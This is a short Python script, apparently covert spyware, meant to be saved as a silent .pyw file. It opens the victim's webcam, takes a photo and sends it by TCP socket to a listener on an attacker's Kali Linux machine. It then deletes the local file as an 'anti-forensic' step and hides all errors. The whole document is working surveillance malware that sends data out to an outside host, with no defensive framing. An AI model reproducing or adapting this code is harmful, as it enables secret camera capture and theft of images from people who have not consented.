# File name → secret.pyw   (or any name with .pyw extension)

import cv2
import socket
import time
import os

# ------------------ Configuration ------------------
KALI_IP = "Kali-Linux IP"           # ←←← Put your Kali Linux machine IP here
PORT = 9999                         # Any free port number
ALSO_SAVE_ON_WINDOWS = False        # Set to True if you want to save on Windows too (for testing)
CAPTURE_FILENAME = "capture.jpg"
# ---------------------------------------------------

def send_file_to_server(filename, server_ip, server_port):
    """
    Send the captured image file to the listening server (Kali)
    Returns True if successful, False if failed
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((server_ip, server_port))
        
        with open(filename, "rb") as file_handle:
            sock.sendfile(file_handle)
        
        sock.close()
        return True
        
    except Exception:
        return False


# Main logic - silently capture from webcam
try:
    # Try to open default camera (0 = built-in, 1 = external, etc.)
    camera = cv2.VideoCapture(0)
    # camera = cv2.VideoCapture(1)   # uncomment if using external USB camera
    
    if not camera.isOpened():
        # Camera not available → do nothing
        pass
    else:
        # Give camera some time to initialize properly
        time.sleep(1.5)
        
        success, frame = camera.read()
        
        if success:
            # Save the captured frame
            cv2.imwrite(CAPTURE_FILENAME, frame)
            
            # Optional: also save to Desktop for local testing/debugging
            if ALSO_SAVE_ON_WINDOWS:
                desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')
                save_path = os.path.join(desktop_path, "test_" + CAPTURE_FILENAME)
                cv2.imwrite(save_path, frame)
            
            # Send the photo to Kali Linux
            send_file_to_server(CAPTURE_FILENAME, KALI_IP, PORT)
            
            # Clean up - remove the local file (anti-forensic / optional)
            try:
                os.remove(CAPTURE_FILENAME)
            except:
                pass

    # Release camera resource
    camera.release()

except Exception:
    # Stay silent on any error
    pass
